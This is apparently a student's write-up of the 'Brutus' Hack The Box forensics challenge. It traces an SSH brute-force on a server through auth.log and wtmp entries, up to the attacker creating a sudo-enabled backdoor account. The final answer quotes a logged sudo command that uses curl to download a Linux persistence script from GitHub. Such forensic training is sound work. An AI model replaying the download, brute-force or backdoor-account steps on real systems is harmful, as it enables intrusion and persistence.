# Box Name:
BRUTUS - Easy Sherlock
# Scenario:
&nbsp; &nbsp; "In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution."
# Provided artifacts:
- **Brutus.zip**
  - **Auth.log**
    - _This is a log file that tracks authentication mechanisms. Including User auth, sudo, and ssh._
  - **WTMP.bin**
    - _WTMP(write temp) is a binary file for user logins and out. Similar to UTMP(current logins) and BTMP(bad logins)_
  - **UTMP.py**
    - _Provided python script to translate the binary file into human readable like the last command in linux_
# Initial Analysis:
&nbsp; &nbsp; My initial overview of the files aligned with the overview. There was a large amount of ssh connection attempts coming from 
65.2.161.68. Among the attempts there was a sucessful attempt that connected and disconnected immediately. Later in the Auth.log _65.2.161.68_ reconnected and ran several commands to create persistence. The account cyberjunkie was created and added to sudo groups. The _65.2.161.68_ address disconnected again and reconnected as cyberjunkie run a script. 
- _Prior to viewing the logs I had to check Brutus.zip hash via ```Get-FileHash "${pwd}\Brutus.zip"```, unzipped the file using 7ZIP, and run the py script to create the proper WTMP file_

# Questions:
1. _Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?_
    - When Parsing the Auth file it was very apparent 65.2.161.68 was the the attacker attempting to brute force the system.
```
Mar  6 06:31:31 ip-172-31-35-28 sshd[2330]: Invalid user admin from 65.2.161.68 port 46422
Mar  6 06:31:31 ip-172-31-35-28 sshd[2337]: Invalid user admin from 65.2.161.68 port 46498
Mar  6 06:31:31 ip-172-31-35-28 sshd[2328]: Invalid user admin from 65.2.161.68 port 46390
Mar  6 06:31:31 ip-172-31-35-28 sshd[2335]: Invalid user admin from 65.2.161.68 port 46460
Mar  6 06:31:31 ip-172-31-35-28 sshd[2337]: pam_unix(sshd:auth): check pass; user unknown
Mar  6 06:31:31 ip-172-31-35-28 sshd[2337]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
```
2. _The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?_
    - About half way down the Auth.log the first successfull connection attempt was on ROOT user.
```
Mar  6 06:31:39 ip-172-31-35-28 sshd[2384]: Received disconnect from 65.2.161.68 port 46732:11: Bye Bye [preauth]
Mar  6 06:31:39 ip-172-31-35-28 sshd[2384]: Disconnected from invalid user svc_account 65.2.161.68 port 46732 [preauth]
Mar  6 06:31:39 ip-172-31-35-28 sshd[2409]: Failed password for root from 65.2.161.68 port 46890 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
```
3. _Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact._
    - This one was rather difficult for the wrong reasosn. From the Auth log we can see the 2nd login was at "06:32:44", however once we reference the WTMP.log we can see the below entry which we have to convert UTC "06:32:45".

Auth.log entry:
```
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
```
WTMP.log:
```
"USER"	"2549"	"pts/1"	"ts/1"	"root"	"65.2.161.68"	"0"	"0"	"0"	"2024/03/06 01:32:45"	"387923"	"65.2.161.68"
```
4. _SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?_
    - This one was pretty simple. The session was 37. As we can see here
```
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```
5. _The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?_
    - This was more very obvious behavior that immediately stands out in the Auth.log. Just skimming the log quickly the account _**cyberjunkie**_ can be seen being created by the attacker. 
```
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
```
6. _What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?_
    - For this question even though the question mentioned persistance we have to ask what did the actor do. Brute Force > Compromise Root > Create a new account > Run scripts. We answered in that thought process. They created a new account for persistence which falls under Persistence([TA0003](https://attack.mitre.org/tactics/TA0003/)) > Create Accout([T1136](https://attack.mitre.org/techniques/T1136/)) > Local Account ([T1136.001](https://attack.mitre.org/techniques/T1136/001/))
7. _What time did the attacker's first SSH session end according to auth.log?_
    - The first session 37 for Root ended at "06:37:24"
```
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
```
8. _The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?_
    - The command that was run was also very visable at the end of the log file due to sudo being used!
```
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```
